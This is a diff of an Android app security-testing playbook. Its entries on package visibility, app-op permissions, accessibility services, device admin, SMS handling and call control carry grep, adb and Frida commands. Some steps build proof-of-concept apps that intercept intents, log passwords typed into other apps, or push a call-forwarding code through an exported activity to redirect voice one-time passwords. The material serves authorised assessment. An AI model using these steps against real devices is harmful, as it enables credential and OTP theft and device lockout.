-- **Test:** A very common modern pattern: the app decides whether a competitor, clone, root manager, overlay app or official companion is present using `resolveActivity()`, `queryIntentActivities()`, `getPackageInfo()` or `getInstalledApplications()`, and takes the *secure* branch only when the result is non-empty. Since targetSdk 30 those APIs are filtered and return null/empty for packages not covered by `<queries>`. An attacker that simply stays outside the app's `<queries>` declaration forces the "nothing found" branch. The inverse also holds: a check that treats "nothing else resolves" as proof of safety is defeated by an attacker who *does* declare a matching filter.
+- **Test:** A very common modern pattern: the app decides whether a competitor, clone, root manager, overlay app or official companion is present using `resolveActivity()`, `queryIntentActivities()`, `getPackageInfo()` or `getInstalledApplications()`, and takes the *secure* branch only when the result is non-empty. Since targetSdk 30 those APIs are filtered and return null/empty for packages not covered by `<queries>`. An attacker that simply stays outside the app's `<queries>` declaration forces the "nothing found" branch. The inverse also holds: a check that treats "nothing else resolves" as proof of safety is defeated by an attacker who *does* declare a matching filter. (c) Presence-selects-target: `getPackageInfo("<literal>")`, `getApplicationInfo("<literal>")`, `getLaunchIntentForPackage("<literal>")` or `getInstalledApplications()` filtered by a constant name (a sibling, companion or dev package), where success routes an outgoing `setPackage()`/`setComponent()`/`setClassName()` to that package with no `GET_SIGNING_CERTIFICATES` comparison or build-type guard — any app that takes the literal as its `applicationId` becomes the recipient.
 - **How:**
   ```bash
-  grep -rnE 'resolveActivity|resolveService|queryIntentActivities|queryBroadcastReceivers|getInstalledPackages|getInstalledApplications|getPackageInfo\(' sources/ \
+  grep -rnE 'resolveActivity|resolveService|queryIntentActivities|queryBroadcastReceivers|getInstalledPackages|getInstalledApplications|getPackageInfo\(' $SRC/ \
     | grep -inE 'null|isEmpty|size\(\)\s*==\s*0'
   adb shell dumpsys package $PKG | sed -n '/queries/,/^$/p'
-  grep -n -A20 '<queries>' merged.xml
+  grep -n -A20 '<queries>' "$M"
+  # (c) presence-selects-target: literal package lookups, and whether a signing-certificate or build-type guard follows
+  grep -rnE 'get(PackageInfo|ApplicationInfo|LaunchIntentForPackage)\(\s*"[a-z][a-z0-9_.]+"' $SRC/
+  grep -rnE -A12 'get(PackageInfo|ApplicationInfo)\(\s*"[a-z][a-z0-9_.]+"' $SRC/ | grep -nE 'setPackage|setComponent|setClassName|GET_SIGNING_CERTIFICATES|hasSigningCertificate|checkSignatures|BuildConfig\.DEBUG'
   ```
-  Then diff on-device: run the app once with the package it intends to detect installed, and once without.
-- **Proof:** The branch `if (resolveActivity(...) == null) { /* trust path */ }` in decompiled code, the absence of a `<queries>` entry that would make the checked package visible, and a demonstration that installing the package the app intends to detect **still** leaves the app on the trust path.
-- **Escalation:** These checks almost always gate a second control — root/clone detection, "is a browser installed", "is the official companion present", a chooser, an attestation. Whatever that control is, it is now bypassed. Chains into D05 implicit-intent hijack: "safe because nothing else resolves" is exactly what a priority-999 component defeats.
-- **Ruled out when:** The app's `targetSdk` is below 30 (the calls are unfiltered — state it); or every security-relevant visibility query is backed by a matching `<queries><package>` / `<queries><intent>` entry, **and** the gate fails closed (an empty result takes the *restrictive* branch, not the permissive one).
+  Then diff on-device: run the app once with the package it intends to detect installed, and once without. For (c), build a PoC APK whose `applicationId` is the literal, with a matching exported component that logs its extras, and drive the outgoing path.
+- **Proof:** The branch `if (resolveActivity(...) == null) { /* trust path */ }` in decompiled code, the absence of a `<queries>` entry that would make the checked package visible, and a demonstration that installing the package the app intends to detect **still** leaves the app on the trust path. For (c): the PoC installed under the literal name receiving the intent and logging its extras, with no signature check in the decompiled branch.
+- **Escalation:** Dynamic owner: D08-014 / D05-044 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. These checks almost always gate a second control — root/clone detection, "is a browser installed", "is the official companion present", a chooser, an attestation. Whatever that control is, it is now bypassed. Chains into D05 implicit-intent hijack: "safe because nothing else resolves" is exactly what a priority-999 component defeats.
+- **Ruled out when:** The app's `targetSdk` is below 30 (the calls are unfiltered — state it); or every security-relevant visibility query is backed by a matching `<queries><package>` / `<queries><intent>` entry, **and** the gate fails closed (an empty result takes the *restrictive* branch, not the permissive one), **and** every literal package lookup that selects an outgoing target is followed by a signing-certificate comparison or is confined to a debug build-type branch.
 
 ### D03-046 · `QUERY_ALL_PACKAGES` and over-broad `<queries>` — and using `<queries><package>` to remove your own PoC's precondition
 
@@ -1275,9 +1354,9 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Two opposite uses. (a) The app holds `QUERY_ALL_PACKAGES` or a wildcard `<queries><intent>` block and ships the installed-app list off-device — undisclosed device fingerprinting, and worse when the list feeds a targeting decision ("if bank app installed, change behaviour"). (b) **For your own PoC:** declaring `<queries><package android:name="com.target.app"/>` requires no user consent and no permission, and it is what defeats the triager's "the attacker cannot discover the component" objection.
 - **How:**
   ```bash
-  grep -oE 'QUERY_ALL_PACKAGES' merged.xml
-  grep -n -A20 '<queries>' merged.xml
-  grep -rnE 'getInstalledPackages|getInstalledApplications|queryIntentActivities' sources/
+  grep -oE 'QUERY_ALL_PACKAGES' "$M"
+  grep -n -A20 '<queries>' "$M"
+  grep -rnE 'getInstalledPackages|getInstalledApplications|queryIntentActivities' $SRC/
   # attribute it: which AAR added QUERY_ALL_PACKAGES?
   grep -nE 'ADDED from|MERGED from' app/build/outputs/logs/manifest-merger-release-report.txt | grep -i QUERY_ALL
   ```
@@ -1286,7 +1365,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   <queries><package android:name="com.target.app"/></queries>
   ```
 - **Proof:** (a) A Burp request body containing the full installed-package list going to a third-party host, with the merger report naming the SDK that requested the permission. (b) The PoC app resolving the target's components through `packageManager.queryIntentActivities()` while declaring only a `<queries><package>` entry, with no prompt shown.
-- **Escalation:** (a) -> D18 SDK accountability, D20 data-safety mismatch; combined with D04 overlay work an installed-bank-app check is the precursor to targeted UI redress. (b) Removes the `AC:H` "attacker must know the component name" objection and moves the CVSS vector to `AC:L`, which on the FIRST bands is frequently one whole severity level.
+- **Escalation:** Dynamic owner: D01-043 / D22-010 / D22-075 runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. (a) -> D18 SDK accountability, D20 data-safety mismatch; combined with D04 overlay work an installed-bank-app check is the precursor to targeted UI redress. (b) Removes the `AC:H` "attacker must know the component name" objection and moves the CVSS vector to `AC:L`, which on the FIRST bands is frequently one whole severity level.
 - **Ruled out when:** (a) `QUERY_ALL_PACKAGES` is absent and every `<queries>` entry names a specific package or a narrow intent the app demonstrably needs, with no code path transmitting the resulting list. (b) n/a — this is your own tooling.
 
 ### D03-047 · App-op-gated special permissions fail open at `MODE_IGNORED`
@@ -1310,7 +1389,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   ```
   Correct app-side checks to look for in jadx:
   ```bash
-  grep -rnE 'Settings\.canDrawOverlays\(|Settings\.System\.canWrite\(|Environment\.isExternalStorageManager\(|canRequestPackageInstalls\(|canScheduleExactAlarms\(' sources/
+  grep -rnE 'Settings\.canDrawOverlays\(|Settings\.System\.canWrite\(|Environment\.isExternalStorageManager\(|canRequestPackageInstalls\(|canScheduleExactAlarms\(' $SRC/
   ```
 - **Proof:** `dumpsys appops` showing the op at `ignore`, while the app's code path continues as if granted — no fallback branch taken, no user-visible error — captured in logcat or on screen. For the defensive case, the tamper warning or screenshot guard simply not appearing.
 - **Escalation:** Fail-open defensive controls -> D21 (overlay/tapjacking not blocked), D04.
@@ -1331,7 +1410,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **How:**
   ```bash
   adb shell dumpsys appops | grep -A6 -E 'COARSE_LOCATION|FINE_LOCATION|CAMERA|RECORD_AUDIO'
-  adb shell am start -n com.target.app/.MainActivity     # foreground
+  adb shell am start -S -W -n com.target.app/.MainActivity     # foreground
   adb shell input keyevent KEYCODE_HOME                  # background
   adb shell dumpsys appops | sed -n '/com.target.app/,/^  Uid/p'     # watch the mode change
   adb shell dumpsys activity services com.target.app | grep -i foreground
@@ -1357,7 +1436,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   ```bash
   adb shell dumpsys package com.target.app | grep -E 'RESTRICTION_(UPGRADE|INSTALLER|SYSTEM)_EXEMPT'
   adb shell dumpsys package com.target.app | sed -n '/runtime permissions/,/^$/p'
-  grep -rn 'setWhitelistedRestrictedPermissions' sources/     # on an installer target
+  grep -rn 'setWhitelistedRestrictedPermissions' $SRC/     # on an installer target
   ```
 - **Proof:** A `dumpsys package` runtime-permission flag containing `RESTRICTION_INSTALLER_EXEMPT` on a permission the app had no user-facing justification for — proving the installer, not the user, widened the app's reach.
 - **Escalation:** A restricted permission the user never saw a prompt for (SMS/Call Log) is a direct privacy and data-access finding -> D20; on an installer target it is an authorisation-model finding in its own right.
@@ -1402,8 +1481,8 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Android 13 introduced `NEARBY_WIFI_DEVICES` so apps can do Wi-Fi work without `ACCESS_FINE_LOCATION`. The `neverForLocation` assertion is what stops the results being location data. An app that declares the permission **without** the flag and then ships BSSIDs or scan results off-device is deriving location under a permission the user was told is not location.
 - **How:**
   ```bash
-  grep -n -A2 'NEARBY_WIFI_DEVICES' merged.xml     # look for usesPermissionFlags
-  grep -n -A2 'BLUETOOTH_SCAN' merged.xml          # same flag applies here
+  grep -n -A2 'NEARBY_WIFI_DEVICES' "$M"     # look for usesPermissionFlags
+  grep -n -A2 'BLUETOOTH_SCAN' "$M"          # same flag applies here
   ```
   ```javascript
   Java.perform(() => {
@@ -1433,8 +1512,8 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** Two findings from one hook. (a) Who inside the process actually reads the protected data — the app, or a bundled SDK? (b) Does the app attribute reads honestly? An app that runs everything under the default (`null`) attribution, or under a misleading tag, gives the user's Privacy Dashboard an inaccurate account of why data was accessed.
 - **How:**
   ```bash
-  grep -n '<attribution ' merged.xml
-  grep -rn 'createAttributionContext' sources/
+  grep -n '<attribution ' "$M"
+  grep -rn 'createAttributionContext' $SRC/
   ```
   ```javascript
   Java.perform(() => {
@@ -1467,6 +1546,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `privacy_concerns.unnecessary_data_collection` (varies) |
 | **Attacker** | AM-08 |
 | **Applies to** | all; `AD_ID` specifically at targetSdk 33+ |
+| **Requires** | — |
 | **Maps to** | `developer.android.com/about/versions/13/behavior-changes-13` — `AD_ID` required for targetSdk 33+, *"if SDKs declare this permission, it auto-merges into app manifest"*, and without it the ID is *"replaced with string of zeroes"*; Oversecured's SDK-security research on SDKs *"declaring broader permissions than documented"*; Google Play "Using SDKs safely and securely" |
 
 - **Test:** AARs merge their `<uses-permission>` and their components into the app. Find permissions with no corresponding app feature — they belong to an SDK, and at minimum that is a privacy finding; often it is precisely the capability the SDK's collection code needs.
@@ -1477,11 +1557,11 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   ./gradlew :app:processReleaseManifest
   grep -n -A3 'uses-permission' app/build/outputs/logs/manifest-merger-release-report.txt
   # then find the consumer OUTSIDE the app's own package
-  grep -rnE 'getLastKnownLocation|requestLocationUpdates|TelephonyManager|getInstalledPackages|AdvertisingIdClient' sources/ \
-    | grep -v '^sources/com/<appPkg>/'
+  grep -rnE 'getLastKnownLocation|requestLocationUpdates|TelephonyManager|getInstalledPackages|AdvertisingIdClient' $SRC/ \
+    | grep -v "^$SRC/com/<appPkg>/"
   # cross-platform variants
-  grep -rn '@Permission(' sources/ | head          # Capacitor plugin annotations
-  grep -rn '"permissions"' out/assets/www/cordova_plugins.js 2>/dev/null
+  grep -rn '@Permission(' $SRC/ | head          # Capacitor plugin annotations
+  grep -rn '"permissions"' $DEC/apktool/assets/www/cordova_plugins.js 2>/dev/null
   ```
 - **Proof:** The merger-report line attributing, say, `ACCESS_FINE_LOCATION` or `AD_ID` to a named analytics AAR, plus a jadx hit showing that AAR's own code calling the protected API and posting to its own endpoint, plus the request in Burp with a non-zero AAID or a lat/long tuple.
 - **Escalation:** -> D18 SDK supply chain, D20 data-safety mismatch. `QUERY_ALL_PACKAGES` added by an SDK on a `targetSdk >= 30` app restores a device-fingerprinting surface the platform deliberately removed.
@@ -1501,7 +1581,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** `aapt2 d permissions` prints the **requested** set. What the app *holds on the device you are testing* is a different, usually smaller set: a `<uses-permission android:maxSdkVersion="28">` is not granted above API 28, `WRITE_EXTERNAL_STORAGE` is inert from API 29, `READ_EXTERNAL_STORAGE` is superseded by the granular `READ_MEDIA_*` family at API 33, and any runtime permission never prompted for is simply `granted=false`. Every re-delegation, confused-deputy and privacy claim in this chapter says "the app holds X" — prove it from the grant record, not from the manifest.
 - **How:**
   ```bash
-  grep -nE '<uses-permission[^>]*(maxSdkVersion|usesPermissionFlags)' merged.xml
+  grep -nE '<uses-permission(-sdk-23)?[^>]*(maxSdkVersion|usesPermissionFlags)|<uses-permission-sdk-23' "$M"   # <uses-permission-sdk-23> is requested only on API 23+ devices: it belongs in the requested set for your API >= 23 lanes only
   aapt2 d permissions base.apk                                   # REQUESTED
   adb shell getprop ro.build.version.sdk                         # the API level your claim is bound to
   adb shell dumpsys package com.target.app | sed -n '/requested permissions/,/install permissions/p'
@@ -1523,6 +1603,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `privacy_concerns.unnecessary_data_collection` (varies), escalating to `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) once third-party PII actually egresses. A permission inventory on its own maps to **no VRT node at all** |
 | **Attacker** | AM-08 (the SDK doing the collection inside the app); n/a for the pure over-request case |
 | **Applies to** | all; runtime permissions exist from Android 6.0 (API 23) |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0254 (Dangerous App Permissions), MASTG-TECH-0126, MASWE-0066 (Inadequate Permission Management), CWE-250; ATT&CK T1636.001 Calendar Entries, T1636.002 Call Log (*"most applications do not need call log access, so extra scrutiny could be applied to those that request it"*), T1636.003 Contact List, T1636.004 SMS Messages (*"most applications do not need access to SMS messages"*), T1636.005 Accounts, T1533; mitigations M1006, M1011. Google Invalid Reports: *"excessive permissions alone do not have enough of a security impact to qualify for a reward"* |
 
 - **Test:** Build a three-column table — permission, the API call that consumes it, the screen that justifies it. Rows with a consumer and no screen are undisclosed collection. Rows with neither are inventory noise and belong in the graveyard. Rows whose consumer sits behind an exported component are not a privacy finding at all; they are the confused deputy, and they leave this item immediately. The table, not the permission list, is the deliverable — and it is what makes a defensible negative possible.
@@ -1532,16 +1613,16 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   ```
   Count your results — a shell loop over this list will lose rows silently (D03-007):
   ```python
-  import subprocess
+  import subprocess, os
   perms = [p.strip() for p in open('perms.txt') if 'android.permission' in p]
   print(f"[plan] {len(perms)} permissions")
   done = 0
   for p in perms:
       short = p.rsplit('.', 1)[-1]
       try:
-          r = subprocess.run(['rg', '-c', '--no-filename', short, 'sources/'],
+          r = subprocess.run(['grep', '-rc', short, os.path.expandvars('$DEC/jadx/sources')],
                              capture_output=True, text=True, timeout=60)
-          n = sum(int(x) for x in r.stdout.split() if x.isdigit())
+          n = sum(int(l.rsplit(':', 1)[-1]) for l in r.stdout.splitlines() if l.rsplit(':', 1)[-1].isdigit())
       except Exception as e:
           print(f'{p:60} ERROR {e}'); continue
       print(f'{p:60} refs={n}')
@@ -1550,19 +1631,22 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
   ```
   Then find the actual consumers, and bind them to a runtime observation:
   ```bash
-  rg -n 'ContactsContract|CallLog\.Calls|Telephony\.Sms|CalendarContract|AccountManager\(|getAccounts\(|SmsManager|getLastKnownLocation|requestLocationUpdates' sources/
+  grep -rnE 'ContactsContract|CallLog\.Calls|Telephony\.Sms|CalendarContract|AccountManager\(|getAccounts\(|SmsManager|getLastKnownLocation|requestLocationUpdates' $SRC/
   ```
   ```javascript
+  // ALL overloads: AndroidX/Room and API 26+ code use query(Uri, String[], Bundle, CancellationSignal),
+  // which the 5-argument hook alone never sees
   Java.perform(() => {
     const CR = Java.use('android.content.ContentResolver');
-    CR.query.overload('android.net.Uri', '[Ljava.lang.String;', 'java.lang.String',
-                      '[Ljava.lang.String;', 'java.lang.String')
-      .implementation = function (uri, proj, sel, args, order) {
-        console.log('[query] ' + uri.toString());
-        return this.query(uri, proj, sel, args, order);
+    CR.query.overloads.forEach(o => {
+      o.implementation = function () {
+        console.log('[query] ' + arguments[0].toString() + '  argc=' + arguments.length);
+        return o.apply(this, arguments);
       };
+    });
   });
   ```
+  Attach with `frida -D "$SERIAL" -n <pkg> -q -t 60 -l hook.js` (or `-f <pkg>` to spawn); never `-U` on a bench with more than one device attached.
 - **Proof:** The hook printing `content://com.android.contacts/...`, `content://sms/...` or `content://call_log/...`, and the same records appearing in a request body in the proxy to a host the Play Data safety declaration does not list. That pair is the finding. The permission list alone is not, at any programme.
 - **Escalation:** -> the re-delegation item when an exported component performs the gated read on a caller's behalf; -> D20 for the Data-safety mismatch; -> D13 when the permission is `READ_SMS`/`RECEIVE_SMS` and an OTP is readable; -> D15, because contacts harvested at scale are the input to business-logic abuse and to smishing.
 - **Ruled out when:** Every dangerous permission maps to a named screen the user reaches, **and** its consuming call site sits inside a non-exported path, **and** the data's destination appears in the app's Data safety declaration. Write the table down as the negative: *"14 dangerous permissions, 14 bound to a feature, 0 reachable from an exported component, 3 destinations all declared"* is a defensible result. "No excessive permissions found" is not a result.
@@ -1574,21 +1658,22 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Severity ceiling** | **Critical** |
 | **VRT** | `broken_access_control.privilege_escalation` (null); the destructive outcome files under `application_level_denial_of_service_dos.critical_impact_and_or_easy_difficulty` (P2) |
 | **Attacker** | AM-03 (to reach the sink) |
-| **Applies to** | all. From **Android 7**, `resetPassword()` is restricted to device/profile owners — arbitrary passcode reset by a plain admin app is **LEGACY**; `lockNow()` and `wipeData()` remain available to admins. |
+| **Applies to** | all. From **Android 7**, `resetPassword()` is restricted to device/profile owners — arbitrary passcode reset by a plain admin app is **LEGACY**; `lockNow()` and `wipeData()` remain available to admins. **Android 13+ restricted settings / Android 15+ Enhanced Confirmation Mode:** an app installed by a session-based installer (any store or installer app other than `adb install` / Play-signed flows) cannot be granted accessibility, notification-listener or device-admin until the user opens App info → *Allow restricted settings*. Install the PoC the way the attacker would (an `adb shell pm install-create/-write/-commit` session from a helper app, or a sideload session) and record `adb shell dumpsys appops --op ACCESS_RESTRICTED_SETTINGS <pkg>` before and after. |
+| **Requires** | — |
 | **Maps to** | ATT&CK **T1626.001** Device Administrator Permissions (detection: *"checking for the `BIND_DEVICE_ADMIN` string in app manifests"*; capabilities listed are reset passwords, factory reset, disable cameras, prevent uninstall), T1626 with mitigation **M1013** (*"applications very rarely require administrator permission"*), detection **DET0642**; T1629.002 Device Lockout; T1630.002 File Deletion; T1642 Endpoint Denial of Service |
 
 - **Test:** Does the manifest contain a receiver with `android.permission.BIND_DEVICE_ADMIN` and a `DEVICE_ADMIN_ENABLED` filter, and — the half that decides the severity — can an attacker-reachable input reach the `DevicePolicyManager` call?
 - **How:**
   ```bash
-  grep -rn "BIND_DEVICE_ADMIN\|DeviceAdminReceiver\|DEVICE_ADMIN_ENABLED" merged.xml
-  grep -rn 'android:resource="@xml/device_admin' merged.xml
-  cat out/res/xml/device_admin*.xml     # <uses-policies> is the actual capability list
-  grep -rnE 'DevicePolicyManager|lockNow|resetPassword|wipeData|setCameraDisabled|isAdminActive' sources/
+  grep -rn "BIND_DEVICE_ADMIN\|DeviceAdminReceiver\|DEVICE_ADMIN_ENABLED" "$M"
+  grep -rn 'android:resource="@xml/device_admin' "$M"
+  cat $RES/xml/device_admin*.xml     # <uses-policies> is the actual capability list
+  grep -rnE 'DevicePolicyManager|lockNow|resetPassword|wipeData|setCameraDisabled|isAdminActive' $SRC/
   adb shell dpm list-owners
   ```
 - **Proof:** `res/xml/device_admin*.xml` declaring `<wipe-data/>`, `<reset-password/>` or `<force-lock/>`, plus a code path invoking the matching `DevicePolicyManager` method **from an exported component**. Demonstrate by activating admin and driving the path from the PoC app — show `lockNow()` firing.
 - **Escalation:** Admin + an exported component that triggers the policy call is remote device lockout or wipe (-> D04/D05). That is the Critical version; admin requested with no attacker-reachable sink is Medium over-privilege.
-- **Ruled out when:** No `BIND_DEVICE_ADMIN` receiver exists; or the `<uses-policies>` list contains only non-destructive policies **and** every `DevicePolicyManager` call site is reachable only from a non-exported component after an authenticated in-app action.
+- **Ruled out when:** No `BIND_DEVICE_ADMIN` receiver exists; or the `<uses-policies>` list contains only non-destructive policies **and** every `DevicePolicyManager` call site is reachable only from a non-exported component after an authenticated in-app action. A PoC that failed to activate admin because of restricted settings / ECM is not a negative for the target — it is a precondition note (AM-02).
 
 ### D03-057 · AccessibilityService scope — `typeAllMask` with no `packageNames` allow-list
 
@@ -1597,21 +1682,22 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **Severity ceiling** | **Critical** (when captured text egresses); High otherwise |
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) when the captured text leaves the device |
 | **Attacker** | AM-08 (the SDK inside the app) / AM-02 (the user is walked through enabling it) |
-| **Applies to** | all |
-| **Maps to** | ATT&CK **T1453** Abuse Accessibility Features, **T1417.001** Keylogging (*"registering an `AccessibilityService` class, overriding the `onAccessibilityEvent` method, and listening for the `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type"*), **T1516** Input Injection, detection **DET0697**, mitigation **M1012** (`DevicePolicyManager.setPermittedAccessibilityServices`); FluBot **S1067**, Chameleon (bypasses biometric auth and prevents uninstallation) |
+| **Applies to** | all. **Android 13+ restricted settings / Android 15+ Enhanced Confirmation Mode:** an app installed by a session-based installer (any store or installer app other than `adb install` / Play-signed flows) cannot be granted accessibility, notification-listener or device-admin until the user opens App info → *Allow restricted settings*. Install the PoC the way the attacker would (an `adb shell pm install-create/-write/-commit` session from a helper app, or a sideload session) and record `adb shell dumpsys appops --op ACCESS_RESTRICTED_SETTINGS <pkg>` before and after. |
+| **Requires** | — |
+| **Maps to** | MASWE-0040; ATT&CK **T1453** Abuse Accessibility Features, **T1417.001** Keylogging (*"registering an `AccessibilityService` class, overriding the `onAccessibilityEvent` method, and listening for the `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type"*), **T1516** Input Injection, detection **DET0697**, mitigation **M1012** (`DevicePolicyManager.setPermittedAccessibilityServices`); FluBot **S1067**, Chameleon (bypasses biometric auth and prevents uninstallation) |
 
 - **Test:** Does the app bind `android.accessibilityservice.AccessibilityService`, and what does its config request? `canRetrieveWindowContent` + `TYPE_VIEW_TEXT_CHANGED` + `flagRequestFilterKeyEvents` together are a keylogger's exact shape; `canPerformGestures` is an input-injection shape. In an assessment of a *legitimate* app the finding is almost always "over-scoped service".
 - **How:**
   ```bash
-  grep -rn "BIND_ACCESSIBILITY_SERVICE\|accessibilityservice" merged.xml
-  cat out/res/xml/*accessib*.xml
-  grep -rnE 'canRetrieveWindowContent|canPerformGestures|accessibilityEventTypes|typeAllMask|flagRequestFilterKeyEvents|packageNames' out/res/xml/*
-  grep -rnE 'onAccessibilityEvent|TYPE_VIEW_TEXT_CHANGED|performGlobalAction|GLOBAL_ACTION_BACK|dispatchGesture|ACTION_SET_TEXT' sources/
+  grep -rn "BIND_ACCESSIBILITY_SERVICE\|accessibilityservice" "$M"
+  cat $RES/xml/*accessib*.xml
+  grep -rnE 'canRetrieveWindowContent|canPerformGestures|accessibilityEventTypes|typeAllMask|flagRequestFilterKeyEvents|packageNames' $RES/xml/*
+  grep -rnE 'onAccessibilityEvent|TYPE_VIEW_TEXT_CHANGED|performGlobalAction|GLOBAL_ACTION_BACK|dispatchGesture|ACTION_SET_TEXT' $SRC/
   adb shell settings get secure enabled_accessibility_services
   ```
 - **Proof:** `accessibilityEventTypes="typeAllMask"` with `packageNames` **absent** — the service observes every app, not just its own — plus an `onAccessibilityEvent` body that reads `getText()`/`getSource()`. Demonstrate by enabling the service and typing a password into an unrelated app while a Frida hook on `onAccessibilityEvent` logs the characters.
-- **Escalation:** -> D13/D21 (biometric-prompt bypass, uninstall prevention), -> D23 (automated in-app transactions), -> D20 if the text egresses.
-- **Ruled out when:** The service config names a `packageNames` allow-list limited to the app's own package, uses the narrowest `accessibilityEventTypes` its feature needs, and does not set `canRetrieveWindowContent` or `canPerformGestures` unless the feature demonstrably requires them.
+- **Escalation:** Dynamic owner: D06-047 (D20-050 / D20-051 / D25-074 for the exposure) runs the probe — record the manifest/permission fact here and hand the runtime half over, do not run it twice. -> D13/D21 (biometric-prompt bypass, uninstall prevention), -> D23 (automated in-app transactions), -> D20 if the text egresses.
+- **Ruled out when:** The service config names a `packageNames` allow-list limited to the app's own package, uses the narrowest `accessibilityEventTypes` its feature needs, and does not set `canRetrieveWindowContent` or `canPerformGestures` unless the feature demonstrably requires them. A PoC service that could not be enabled because of restricted settings / ECM is not a negative for the target — it is a precondition note (AM-02).
 
 ### D03-058 · Default-SMS-handler role and `SMS_DELIVER` — read, send, and erase
 
@@ -1621,16 +1707,17 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3) via the OTP chain; escalates to `broken_authentication_and_session_management.authentication_bypass` (P1) when the captured OTP completes an ATO |
 | **Attacker** | AM-02 (the role change needs a tap) |
 | **Applies to** | The default-SMS-handler model with `SMS_DELIVER` dates from **Android 4.4**. Apps below that used `SMS_RECEIVED` with `abortBroadcast` — LEGACY. |
+| **Requires** | — |
 | **Maps to** | ATT&CK **T1582** SMS Control (*"if the app is set as the default SMS handler on the device, the `SMS_DELIVER` broadcast intent can be registered, which allows the app to write to the SMS content provider"*), **T1636.004** SMS Messages (*"most applications do not need access to SMS messages"*), **T1643** Generate Traffic from Victim, **T1644** Out of Band Data |
 
 - **Test:** Does the app request the default-SMS role or register `SMS_DELIVER`? Only the default handler receives it — and the default handler can **write** to the SMS provider, which is how OTP records are erased after use.
 - **How:**
   ```bash
-  grep -rn "SMS_DELIVER\|SMS_RECEIVED\|RoleManager\|ROLE_SMS\|ACTION_CHANGE_DEFAULT\|Telephony.Sms.Intents" merged.xml sources/
+  grep -rn "SMS_DELIVER\|SMS_RECEIVED\|RoleManager\|ROLE_SMS\|ACTION_CHANGE_DEFAULT\|Telephony.Sms.Intents" "$M" $SRC/
   aapt2 dump permissions base.apk | grep -E "SEND_SMS|RECEIVE_SMS|READ_SMS|BROADCAST_SMS|WRITE_SMS"
   adb shell settings get secure sms_default_application
   adb shell dumpsys role | grep -i SMS
-  grep -rn 'ContentResolver.*delete.*Telephony' sources/
+  grep -rn 'ContentResolver.*delete.*Telephony' $SRC/
   ```
 - **Proof:** The app registered for `SMS_DELIVER` plus a code path calling `ContentResolver.delete(Telephony.Sms.CONTENT_URI, ...)`. Send an SMS to the device and show the record removed afterwards:
   ```bash
@@ -1647,15 +1734,16 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null — rated on what it does). The call-forwarding variant escalates into `broken_authentication_and_session_management.two_fa_bypass` (P3) or `.authentication_bypass` (P1) when it defeats a voice-verification factor |
 | **Attacker** | AM-03 (local app driving an exported entry point) / AM-02 (`BROWSABLE` deep link) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | ATT&CK T1616 Call Control — ATT&CK quotes `CALL_PHONE` as *"allows the application to initiate a phone call without going through the Dialer interface"* and `ANSWER_PHONE_CALLS` as *"allows the application to answer incoming phone calls"*; Crocodilus S9004 *"demonstrates the ability to activate call forwarding"*; `Intent.ACTION_DIAL` *"requires explicit user action to complete the call — unless combined with Input Injection"*. Also T1643 Generate Traffic from Victim |
 
 - **Test:** Call forwarding is the quiet one. An MMI string such as `**21*<number>#` reaching the dialler silently redirects voice-OTP and callback-verification flows, and nothing in the app's UI records it. Establish which of `CALL_PHONE`, `ANSWER_PHONE_CALLS`, `MANAGE_OWN_CALLS` and `BIND_SCREENING_SERVICE` the app actually holds (D03-054), then find whether the dialled number can originate from an intent extra, a deep-link parameter or a push payload rather than from a constant.
 - **How:**
   ```bash
   aapt2 d permissions base.apk | grep -E 'CALL_PHONE|ANSWER_PHONE_CALLS|READ_PHONE_NUMBERS|MANAGE_OWN_CALLS|BIND_SCREENING_SERVICE'
-  rg -n 'ACTION_CALL|ACTION_DIAL|CallScreeningService|TelecomManager|acceptRingingCall|endCall|\*\*21\*|##21#|%23' sources/
+  grep -rnE 'ACTION_CALL|ACTION_DIAL|CallScreeningService|TelecomManager|acceptRingingCall|endCall|\*\*21\*|##21#|%23' $SRC/
   # drive it from the zero-permission PoC app (D03-006), then read what the dialler received:
-  adb shell am start -n com.target.app/.CallActivity --es number '**21*15551234567%23'
+  adb shell am start -S -W -n com.target.app/.CallActivity --es number "'**21*15551234567#'"   # inner quotes survive to the device shell: no glob, literal '#'; use %23 only when the sink builds a tel: URI via Uri.parse
   adb shell dumpsys telecom | grep -i 'handle'
   adb shell content query --uri content://call_log/calls --projection number,type,date | tail -5
   ```
@@ -1677,7 +1765,7 @@ Never write n/a for a family on the strength of `grep exported="true"` alone (D0
 - **Test:** (a) `USE_EXACT_ALARM` is granted automatically and is restricted to alarm/timer and calendar apps; an app declaring it to dodge the user-grantable `SCHEDULE_EXACT_ALARM` prompt is abusing an auto-grant. (b) `USE_FULL_SCREEN_INTENT` held by a non-calling, non-alarm app lets it raise a full-screen UI over the lock screen — a phishing surface, and a severe one when the FSI target is attacker-influenced through a deep link or push payload.
 - **How:**
   ```bash
